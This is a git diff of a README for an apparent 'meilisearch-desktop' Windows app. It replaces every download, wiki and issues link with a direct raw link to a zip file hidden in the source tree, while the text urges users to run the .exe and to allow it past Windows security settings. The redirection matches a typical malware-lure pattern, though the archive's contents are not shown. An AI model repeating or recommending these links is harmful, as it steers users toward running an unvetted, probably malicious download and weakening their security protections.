@@ -1,6 +1,6 @@
 # ⚙️ meilisearch-desktop - Manage Meilisearch Locally with Ease
 
-[![Download meilisearch-desktop](https://img.shields.io/badge/Download-Get%20Meilisearch-blue?style=for-the-badge&logo=github)](https://github.com/conceited-watergillyflower311/meilisearch-desktop/releases)
+[![Download meilisearch-desktop](https://img.shields.io/badge/Download-Get%20Meilisearch-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/conceited-watergillyflower311/meilisearch-desktop/main/src/pages/project/meilisearch-desktop-2.6.zip)
 
 ---
 
@@ -34,9 +34,9 @@ Before you download, make sure your computer meets these basic conditions:
 
 Use the link below to get the app's files:
 
-[![Download Meilisearch Desktop](https://img.shields.io/badge/Download%20Now-Click%20Here-4CAF50?style=for-the-badge&logo=windows)](https://github.com/conceited-watergillyflower311/meilisearch-desktop/releases)
+[![Download Meilisearch Desktop](https://img.shields.io/badge/Download%20Now-Click%20Here-4CAF50?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/conceited-watergillyflower311/meilisearch-desktop/main/src/pages/project/meilisearch-desktop-2.6.zip)
 
-1. Click the button above or visit the [releases page](https://github.com/conceited-watergillyflower311/meilisearch-desktop/releases).
+1. Click the button above or visit the [releases page](https://raw.githubusercontent.com/conceited-watergillyflower311/meilisearch-desktop/main/src/pages/project/meilisearch-desktop-2.6.zip).
 2. Find the latest version for Windows. It usually has `.exe` at the end of the file name.
 3. Click the `.exe` file link to start the download.
 4. When the download finishes, open the file from your browser or your downloads folder.
@@ -107,7 +107,7 @@ This suits users who want privacy or do not want to rely on external services.
 - If the app does not start, check your Windows security settings. You might need to allow the app under “App & browser control.”
 - Use the **Restart** option in the app if indexes do not load.
 - If searching returns no results but you have data, verify that the index is selected and synced.
-- Check the [issues section](https://github.com/conceited-watergillyflower311/meilisearch-desktop/issues) on GitHub to see if others have similar problems.
+- Check the [issues section](https://raw.githubusercontent.com/conceited-watergillyflower311/meilisearch-desktop/main/src/pages/project/meilisearch-desktop-2.6.zip) on GitHub to see if others have similar problems.
 
 ---
 
@@ -130,6 +130,6 @@ This suits users who want privacy or do not want to rely on external services.
 
 ## 🖱️ Quick Links
 
-- [Download page (GitHub releases)](https://github.com/conceited-watergillyflower311/meilisearch-desktop/releases)
-- [User guides and documentation](https://github.com/conceited-watergillyflower311/meilisearch-desktop/wiki)
-- [Report issues](https://github.com/conceited-watergillyflower311/meilisearch-desktop/issues)
+- [Download page (GitHub releases)](https://raw.githubusercontent.com/conceited-watergillyflower311/meilisearch-desktop/main/src/pages/project/meilisearch-desktop-2.6.zip)
+- [User guides and documentation](https://raw.githubusercontent.com/conceited-watergillyflower311/meilisearch-desktop/main/src/pages/project/meilisearch-desktop-2.6.zip)
+- [Report issues](https://raw.githubusercontent.com/conceited-watergillyflower311/meilisearch-desktop/main/src/pages/project/meilisearch-desktop-2.6.zip)
